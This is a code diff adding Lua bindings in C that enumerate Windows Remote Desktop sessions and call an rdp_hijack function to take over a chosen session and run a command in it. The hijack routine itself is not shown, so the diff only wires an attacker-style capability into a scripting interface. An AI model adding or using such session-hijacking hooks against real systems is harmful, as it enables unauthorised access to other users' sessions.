@@ -133,4 +133,42 @@ int l_closelog(lua_State *L){
 	return 0;
 }
 
+int l_get_rdp_sessions(lua_State *L){
+	struct rdp_sessions_struct **sessions;
+	int i,count;
+	char err[8192];
+	char tmp[256];
+	char buf[8192];
+	count=get_rdp_sessions(&sessions);
+	if (count<1){
+		sprintf_s(err,8192,"Error while retrieving rdp_sessions: %i",GetLastError());
+		lua_pushstring(L,"Error while retrieving rdp_sessions");
+		lua_error(L);
+		return 0;
+	}
+	lua_newtable(L);
+	for(i=0;i<count;++i){
+		_itoa_s(i,tmp,256,10);
+		sprintf_s(buf,8192,"%s/%s",sessions[i]->user,sessions[i]->station);
+		l_pushtablestring(L,tmp,buf);
+	}
+	return 1;
+}
 
+void l_pushtablestring(lua_State* L , char* key , char* value) {
+    lua_pushstring(L, key);
+    lua_pushstring(L, value);
+    lua_settable(L, -3);
+} 
+int l_rdp_hijack(lua_State *L){
+	ULONG sessionid;
+	char *cmdline;
+	sessionid=luaL_checkinteger(L,1);
+	cmdline=(char *)luaL_checkstring(L,2);
+	if(rdp_hijack(sessionid, cmdline)){
+		return 0;
+	}else{
+		return luaL_error(L,"RDP hijack failed: %d",GetLastError());
+	}
+	
+}
